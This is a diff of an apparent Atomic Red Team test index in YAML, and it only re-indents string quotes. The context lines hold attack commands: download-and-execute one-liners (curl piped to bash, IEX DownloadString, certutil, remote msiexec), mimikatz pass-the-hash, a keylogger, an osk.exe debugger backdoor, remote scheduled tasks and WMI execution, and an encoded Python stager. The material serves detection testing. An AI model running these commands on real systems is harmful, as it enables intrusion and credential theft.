         Test execution of a command using rundll32.exe with syssetup.dll.
@@ -23777,7 +23777,7 @@ execution:
         command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
           128 .\#{inf_to_execute}
 
-'
+          '
     - name: Rundll32 setupapi.dll Execution
       description: |
         Test execution of a command using rundll32.exe with setupapi.dll.
@@ -23803,7 +23803,7 @@ execution:
         command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
           .\#{inf_to_execute}
 
-'
+          '
   T1053:
     technique:
       x_mitre_permissions_required:
@@ -23908,7 +23908,7 @@ execution:
         elevation_required: false
         command: 'at 13:20 /interactive cmd
 
-'
+          '
     - name: Scheduled task Local
       description: "Upon successful execution, cmd.exe will create a scheduled task
         to spawn cmd.exe at 20:10. \n"
@@ -23928,10 +23928,10 @@ execution:
         elevation_required: true
         command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
 
-'
+          '
         cleanup_command: 'SCHTASKS /Delete /TN spawn /F
 
-'
+          '
     - name: Scheduled task Remote
       description: "Create a task on a remote system.\n\nUpon successful execution,
         cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote
@@ -23965,10 +23965,10 @@ execution:
         command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
-'
+          '
         cleanup_command: 'SCHTASKS /Delete /TN "Atomic task" /F
 
-'
+          '
     - name: Powershell Cmdlet Scheduled Task
       description: "Create an atomic scheduled task that leverages native powershell
         cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled
@@ -23988,7 +23988,7 @@ execution:
         cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
           >$null 2>&1
 
-'
+          '
   T1064:
     technique:
       x_mitre_permissions_required:
@@ -24057,7 +24057,7 @@ execution:
     - name: Create and Execute Bash Shell Script
       description: 'Creates and executes a simple bash script.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -24072,7 +24072,7 @@ execution:
     - name: Create and Execute Batch Script
       description: 'Creates and executes a simple batch script.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24092,7 +24092,7 @@ execution:
           \n"
         cleanup_command: 'del #{script_to_create} >nul 2>&1
 
-'
+          '
   T1035:
     technique:
       x_mitre_data_sources:
@@ -24190,7 +24190,7 @@ execution:
         elevation_required: false
         command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
 
-'
+          '
   T1218:
     technique:
       x_mitre_data_sources:
@@ -24304,7 +24304,7 @@ execution:
       description: 'Injects arbitrary DLL into running process specified by process
         ID. Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24328,12 +24328,12 @@ execution:
         elevation_required: true
         command: 'mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
 
-'
+          '
     - name: SyncAppvPublishingServer - Execute arbitrary PowerShell code
       description: 'Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.
         Requires Windows 10.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24345,12 +24345,12 @@ execution:
         name: command_prompt
         command: 'SyncAppvPublishingServer.exe "n; #{powershell_code}"
 
-'
+          '
     - name: Register-CimProvider - Execute evil dll
       description: 'Execute arbitrary dll. Requires at least Windows 8/2012. Also
         note this dll can be served up via SMB
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24369,12 +24369,12 @@ execution:
         name: command_prompt
         command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
 
-'
+          '
     - name: Msiexec.exe - Execute Local MSI file
       description: 'Execute arbitrary MSI file. Commonly seen in application installation.
         The MSI opens notepad.exe when sucessfully executed.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24391,13 +24391,13 @@ execution:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
 
-'
+          '
     - name: Msiexec.exe - Execute Remote MSI file
       description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
         in application installation, commonly seen in malware execution. The MSI opens
         notepad.exe when sucessfully executed.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24409,12 +24409,12 @@ execution:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
 
-'
+          '
     - name: Msiexec.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
         installation.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24433,11 +24433,11 @@ execution:
         name: command_prompt
         command: 'msiexec.exe /y "#{dll_payload}"
 
-'
+          '
     - name: Odbcconf.exe - Execute Arbitrary DLL
       description: 'Execute arbitrary DLL file stored locally.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24456,7 +24456,7 @@ execution:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
 
-'
+          '
     - name: InfDefaultInstall.exe .inf Execution
       description: |
         Test execution of a .inf using InfDefaultInstall.exe
@@ -24481,7 +24481,7 @@ execution:
         elevation_required: false
         command: 'InfDefaultInstall.exe #{inf_to_execute}
 
-'
+          '
   T1216:
     technique:
       x_mitre_data_sources:
@@ -24538,7 +24538,7 @@ execution:
       description: 'Executes the signed PubPrn.vbs script with options to download
         and execute an arbitrary payload.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24552,12 +24552,12 @@ execution:
         command: 'cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
           localhost "script:#{remote_payload}"
 
-'
+          '
     - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
       description: 'Executes the signed SyncAppvPublishingServer script with options
         to execute an arbitrary PowerShell command.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24570,12 +24570,12 @@ execution:
         elevation_required: false
         command: 'C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
 
-'
+          '
     - name: manage-bde.wsf Signed Script Command Execution
       description: 'Executes the signed manage-bde.wsf script with options to execute
         an arbitrary command.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24591,7 +24591,7 @@ execution:
           cscript manage-bde.wsf
         cleanup_command: 'set comspec=C:\Windows\System32\cmd.exe
 
-'
+          '
   T1153:
     technique:
       x_mitre_data_sources:
@@ -24636,7 +24636,7 @@ execution:
     - name: Execute Script using Source
       description: 'Creates a script and executes it using the source command
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -24650,7 +24650,7 @@ execution:
       description: 'Creates a script and executes it using the source command''s dot
         alias
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -24720,7 +24720,7 @@ execution:
     - name: Space After Filename
       description: 'Space After Filename
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -24927,7 +24927,7 @@ execution:
     - name: MSBuild Bypass Using Inline Tasks
       description: 'Executes the code in a project file using. C# Example
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -24947,7 +24947,7 @@ execution:
         elevation_required: false
         command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
 
-'
+          '
   T1204:
     technique:
       x_mitre_data_sources:
@@ -25037,7 +25037,7 @@ execution:
         jse_path:
           description: 'Path for the macro to write out the "malicious" .jse file
 
-'
+            '
           type: String
           default: C:\Users\Public\art.jse
       dependency_executor_name: powershell
@@ -25093,7 +25093,7 @@ execution:
         cleanup_command: 'Remove-ItemProperty -Path ''HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\''
           -Name ''AccessVBOM'' -ErrorAction Ignore
 
-'
+          '
     - name: OSTAP JS version
       description: "Malicious JavaScript executing CMD which spaws wscript.exe //e:jscript
         \nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1)
@@ -25204,7 +25204,7 @@ execution:
         elevation_required: false
         command: 'wmic useraccount get /ALL /format:csv
 
-'
+          '
     - name: WMI Reconnaissance Processes
       description: |
         An adversary might use WMI to list Processes running on the compromised host.
@@ -25216,7 +25216,7 @@ execution:
         elevation_required: false
         command: 'wmic process get caption,executablepath,commandline /format:csv
 
-'
+          '
     - name: WMI Reconnaissance Software
       description: |
         An adversary might use WMI to list installed Software hotfix and patches.
@@ -25228,7 +25228,7 @@ execution:
         elevation_required: false
         command: 'wmic qfe get description,installedOn /format:csv
 
-'
+          '
     - name: WMI Reconnaissance List Remote Services
       description: "An adversary might use WMI to check if a certain Remote Service
         is running on a remote device. \nWhen the test completes, a service information
@@ -25252,7 +25252,7 @@ execution:
         elevation_required: false
         command: 'wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")
 
-'
+          '
     - name: WMI Execute Local Process
       description: |
         This test uses wmic.exe to execute a process on the local host.
@@ -25269,10 +25269,10 @@ execution:
         elevation_required: false
         command: 'wmic process call create #{process_to_execute}
 
-'
+          '
         cleanup_command: 'wmic process where name=''#{process_to_execute}'' delete
 
-'
+          '
     - name: WMI Execute Remote Process
       description: "This test uses wmic.exe to execute a process on a remote host.
         Specify a valid value for remote IP using the node parameter.\nTo clean up,
@@ -25295,11 +25295,11 @@ execution:
         elevation_required: false
         command: 'wmic /node:"#{node}" process call create #{process_to_execute}
 
-'
+          '
         cleanup_command: 'wmic /node:"#{node}" process where name=''#{process_to_execute}''
           delete
 
-'
+          '
   T1028:
     technique:
       x_mitre_data_sources:
@@ -25371,7 +25371,7 @@ execution:
         elevation_required: true
         command: 'Enable-PSRemoting -Force
 
-'
+          '
     - name: PowerShell Lateral Movement
       description: "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon
         successful execution, cmd will spawn calc.exe on a remote computer. \n"
@@ -25387,7 +25387,7 @@ execution:
         command: 'powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
-'
+          '
     - name: WMIC Process Call Create
       description: |
         Utilize WMIC to start remote process.
@@ -25415,7 +25415,7 @@ execution:
           NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\"
           /t REG_SZ /d \"cmd.exe\" /f"
 
-'
+          '
     - name: Psexec
       description: |
         Utilize psexec to start remote process.
@@ -25473,7 +25473,7 @@ execution:
         name: powershell
         command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
-'
+          '
   T1220:
     technique:
       x_mitre_data_sources:
@@ -25569,7 +25569,7 @@ execution:
         transformation using a local payload. Requires download of MSXSL from Microsoft
         at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -25597,13 +25597,13 @@ execution:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
-'
+          '
     - name: MSXSL Bypass using remote files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a remote payload. Requires download of MSXSL from Microsoft
         at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -25619,12 +25619,12 @@ execution:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
-'
+          '
     - name: WMIC bypass using local XSL file
       description: 'Executes the code specified within a XSL script using a local
         payload.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -25647,12 +25647,12 @@ execution:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
 
-'
+          '
     - name: WMIC bypass using remote XSL file
       description: 'Executes the code specified within a XSL script using a remote
         payload.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -25668,7 +25668,7 @@ execution:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
 
-'
+          '
 lateral-movement:
   T1155:
     technique:
@@ -25738,7 +25738,7 @@ lateral-movement:
         command: 'osascript "do shell script "echo \"import sys,base64,warnings;warnings.filterwarnings(''ignore'');exec(base64.b64decode(''aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK''));\"
           | python &""
 
-'
+          '
   '':
     technique:
       x_mitre_data_sources:
@@ -25855,7 +25855,7 @@ lateral-movement:
       description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
         directory.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -25880,7 +25880,7 @@ lateral-movement:
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -25895,7 +25895,7 @@ lateral-movement:
     - name: Logon Scripts - Mac
       description: 'Mac logon script
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -25911,7 +25911,7 @@ lateral-movement:
       description: 'vbs files can be placed in and ran from the startup folder to
         maintain persistance
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -26032,11 +26032,11 @@ lateral-movement:
         name: command_prompt
         command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
 
-'
+          '
     - name: crackmapexec Pass the Hash
       description: 'command execute with crackmapexec
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26136,7 +26136,7 @@ lateral-movement:
     - name: Mimikatz Kerberos Ticket Attack
       description: 'Similar to PTH, but attacking Kerberos
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26152,7 +26152,7 @@ lateral-movement:
         name: command_prompt
         command: 'mimikatz # kerberos::ptt #{user_name}@#{domain}
 
-'
+          '
   T1076:
     technique:
       x_mitre_permissions_required:
@@ -26225,7 +26225,7 @@ lateral-movement:
         - how to hijack RDS and RemoteApp sessions transparently to move through an
         organization
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -26237,12 +26237,12 @@ lateral-movement:
           net start sesshijack
         cleanup_command: 'sc.exe delete sesshijack
 
-'
+          '
     - name: RDPto-DomainController
       description: 'Attempt an RDP session via "Connect-RDP" to a system. Default
         RDPs to (%logonserver%) as the current user
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26265,7 +26265,7 @@ lateral-movement:
         elevation_required: false
         command: 'Connect-RDP -ComputerName #{logonserver} -User #{username}
 
-'
+          '
   T1105:
     technique:
       x_mitre_data_sources:
@@ -26317,7 +26317,7 @@ lateral-movement:
     - name: rsync remote file copy (push)
       description: 'Utilize rsync to perform a remote file copy (push)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -26342,11 +26342,11 @@ lateral-movement:
         name: bash
         command: 'rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 
-'
+          '
     - name: rsync remote file copy (pull)
       description: 'Utilize rsync to perform a remote file copy (pull)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -26371,11 +26371,11 @@ lateral-movement:
         name: bash
         command: 'rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 
-'
+          '
     - name: scp remote file copy (push)
       description: 'Utilize scp to perform a remote file copy (push)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -26400,11 +26400,11 @@ lateral-movement:
         name: bash
         command: 'scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 
-'
+          '
     - name: scp remote file copy (pull)
       description: 'Utilize scp to perform a remote file copy (pull)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -26429,11 +26429,11 @@ lateral-movement:
         name: bash
         command: 'scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-'
+          '
     - name: sftp remote file copy (push)
       description: 'Utilize sftp to perform a remote file copy (push)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -26458,11 +26458,11 @@ lateral-movement:
         name: bash
         command: 'sftp #{username}@#{remote_host}:#{remote_path} <<< $''put #{local_file}''
 
-'
+          '
     - name: sftp remote file copy (pull)
       description: 'Utilize sftp to perform a remote file copy (pull)
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -26487,12 +26487,12 @@ lateral-movement:
         name: bash
         command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-'
+          '
     - name: certutil download (urlcache)
       description: 'Use certutil -urlcache argument to download a file from the web.
         Note - /urlcache also works!
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26509,12 +26509,12 @@ lateral-movement:
         elevation_required: false
         command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
 
-'
+          '
     - name: certutil download (verifyctl)
       description: 'Use certutil -verifyctl argument to download a file from the web.
         Note - /verifyctl also works!
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26559,7 +26559,7 @@ lateral-movement:
         command: 'C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority
           HIGH #{remote_file} #{local_path}
 
-'
+          '
     - name: Windows - PowerShell Download
       description: |
         This test uses PowerShell to download a payload.
@@ -26580,15 +26580,15 @@ lateral-movement:
         command: '(New-Object System.Net.WebClient).DownloadFile("#{remote_file}",
           "#{destination_path}")
 
-'
+          '
         cleanup_command: 'Remove-Item #{destination_path} -Force -ErrorAction Ignore
 
-'
+          '
     - name: OSTAP Worming Activity
       description: 'OSTap copies itself in a specfic way to shares and secondary drives.
         This emulates the activity.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26704,7 +26704,7 @@ lateral-movement:
     - name: Map admin share
       description: 'Connecting To Remote Shares
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26730,11 +26730,11 @@ lateral-movement:
         command: 'cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password}
           /u:#{user_name}"
 
-'
+          '
     - name: Map Admin Share PowerShell
       description: 'Map Admin share utilizing PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26755,12 +26755,12 @@ lateral-movement:
         elevation_required: false
         command: 'New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
 
-'
+          '
     - name: Copy and Execute File with PsExec
       description: 'Copies a file to a remote host and executes it using PsExec. Requires
         the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -26777,7 +26777,7 @@ lateral-movement:
         elevation_required: true
         command: 'psexec.exe #{remote_host} -c #{command_path}
 
-'
+          '
     - name: Execute command writing output to local Admin Share
       description: |
         Executes a command, writing the output to a local Admin Share.
@@ -26799,7 +26799,7 @@ lateral-movement:
         command: 'cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file}
           2>&1
 
-'
+          '
   T1028:
     technique:
       x_mitre_data_sources:
@@ -26871,7 +26871,7 @@ lateral-movement:
         elevation_required: true
         command: 'Enable-PSRemoting -Force
 
-'
+          '
     - name: PowerShell Lateral Movement
       description: "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon
         successful execution, cmd will spawn calc.exe on a remote computer. \n"
@@ -26887,7 +26887,7 @@ lateral-movement:
         command: 'powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
-'
+          '
     - name: WMIC Process Call Create
       description: |
         Utilize WMIC to start remote process.
@@ -26915,7 +26915,7 @@ lateral-movement:
           NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\"
           /t REG_SZ /d \"cmd.exe\" /f"
 
-'
+          '
     - name: Psexec
       description: |
         Utilize psexec to start remote process.
@@ -26973,7 +26973,7 @@ lateral-movement:
         name: powershell
         command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
-'
+          '
 collection:
   T1123:
     technique:
@@ -27025,7 +27025,7 @@ collection:
         elevation_required: false
         command: 'powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
 
-'
+          '
   T1119:
     technique:
       x_mitre_permissions_required:
@@ -27082,7 +27082,7 @@ collection:
     - name: Automated Collection Command Prompt
       description: 'Automated Collection
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27093,7 +27093,7 @@ collection:
     - name: Automated Collection PowerShell
       description: 'Automated Collection
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27102,11 +27102,11 @@ collection:
         command: 'Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName
           -destination c:\temp}
 
-'
+          '
     - name: Recon information for export with PowerShell
       description: 'collect information for exfiltration
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27123,7 +27123,7 @@ collection:
     - name: Recon information for export with Command Prompt
       description: 'collect information for exfiltration
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27187,7 +27187,7 @@ collection:
     - name: Utilize Clipboard to store or execute commands from
       description: 'Add data to clipboard to copy off or execute commands from.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27199,12 +27199,12 @@ collection:
           clip < %temp%\T1115.txt
         cleanup_command: 'del %temp%\T1115.txt >nul 2>&1
 
-'
+          '
     - name: PowerShell
       description: 'Utilize PowerShell to echo a command to clipboard and execute
         it
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27259,7 +27259,7 @@ collection:
       description: 'Utilize powershell to download discovery.bat and save to a local
         file
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27268,12 +27268,12 @@ collection:
         command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat'')
           > pi.log
 
-'
+          '
     - name: Stage data from Discovery.sh
       description: 'Utilize curl to download discovery.sh and execute a basic information
         gathering shell script
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -27282,12 +27282,12 @@ collection:
         command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
           | bash -s > /tmp/discovery.log
 
-'
+          '
     - name: Zip a Folder with PowerShell for Staging in Temp
       description: 'Use living off the land tools to zip a file and stage it in the
         Windows temporary folder for later exfiltration.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -27296,11 +27296,11 @@ collection:
         command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_zip
           -DestinationPath $env:TEMP\Folder_to_zip.zip
 
-'
+          '
         cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip -ErrorAction
           Ignore
 
-'
+          '
   '':
     technique:
       x_mitre_permissions_required:
@@ -27497,7 +27497,7 @@ collection:
       description: 'Search through local Outlook installation, extract mail, compress
         the contents, and saves everything to a directory for later exfiltration.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -27511,10 +27511,10 @@ collection:
         command: 'powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1
           -file #{output_file}
 
-'
+          '
         cleanup_command: 'del #{output_file} >nul 2>&1
 
-'
+          '
   T1056:
     technique:
       x_mitre_data_sources:
@@ -27598,7 +27598,7 @@ collection:
           .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
         cleanup_command: 'Remove-Item $env:TEMP\key.log -ErrorAction Ignore
 
-'
+          '
   T1113:
     technique:
       x_mitre_data_sources:
@@ -27654,7 +27654,7 @@ collection:
     - name: Screencapture
       description: 'Use screencapture command to collect a full desktop screenshot
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -27667,11 +27667,11 @@ collection:
         elevation_required: false
         command: 'screencapture #{output_file}
 
-'
+          '
     - name: Screencapture (silent)
       description: 'Use screencapture command to collect a full desktop screenshot
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -27684,12 +27684,12 @@ collection:
         elevation_required: false
         command: 'screencapture -x #{output_file}
 
-'
+          '
     - name: X Windows Capture
       description: 'Use xwd command to collect a full desktop screenshot and review
         file with xwud
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -27705,7 +27705,7 @@ collection:
     - name: Import
       description: 'Use import command to collect a full desktop screenshot
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -27717,7 +27717,7 @@ collection:
         name: bash
         command: 'import -window root #{output_file}
 
-'
+          '
 exfiltration:
   '':
     technique:
@@ -27836,10 +27836,10 @@ exfiltration:
         elevation_required: false
         command: 'dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
 
-'
+          '
         cleanup_command: 'Remove-Item -path #{output_file} -ErrorAction Ignore
 
-'
+          '
     - name: Compress Data for Exfiltration With Rar
       description: "An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration.\nWhen the test completes you should find
@@ -27881,15 +27881,15 @@ exfiltration:
         elevation_required: false
         command: '"#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}
 
-'
+          '
         cleanup_command: 'del /f /q /s #{output_file} >nul 2>&1
 
-'
+          '
     - name: Data Compressed - nix - zip
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard zip compression.
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -27913,18 +27913,18 @@ exfiltration:
         elevation_required: false
         prereq_command: 'ls #{input_files} > /dev/null
 
-'
+          '
         command: 'zip #{output_file} #{input_files}
 
-'
+          '
         cleanup_command: 'rm -f #{output_file}
 
-'
+          '
     - name: Data Compressed - nix - gzip Single File
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -27944,15 +27944,15 @@ exfiltration:
         command: 'test -e #{input_file} && gzip -k #{input_file} || (echo ''#{input_content}''
           >> #{input_file}; gzip -k #{input_file})
 
-'
+          '
         cleanup_command: 'rm -f #{input_file}.gz
 
-'
+          '
     - name: Data Compressed - nix - tar Folder or File
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -27975,10 +27975,10 @@ exfiltration:
         elevation_required: false
         command: 'tar -cvzf #{output_file} #{input_file_folder}
 
-'
+          '
         cleanup_command: 'rm -f #{output_file}
 
-'
+          '
   T1022:
     technique:
       x_mitre_data_sources:
@@ -28037,7 +28037,7 @@ exfiltration:
     - name: Data Encrypted with zip and gpg symmetric
       description: 'Encrypt data for exiltration
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -28057,7 +28057,7 @@ exfiltration:
           ls -l
         cleanup_command: 'rm -Rf /tmp/victim-files
 
-'
+          '
     - name: Compress Data and lock with password for Exfiltration with winrar
       description: |
         Note: Requires winrar installation
@@ -28114,7 +28114,7 @@ exfiltration:
     - name: Compress Data and lock with password for Exfiltration with 7zip
       description: 'Note: Requires 7zip installation
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -28175,7 +28175,7 @@ exfiltration:
     - name: Data Transfer Size Limits
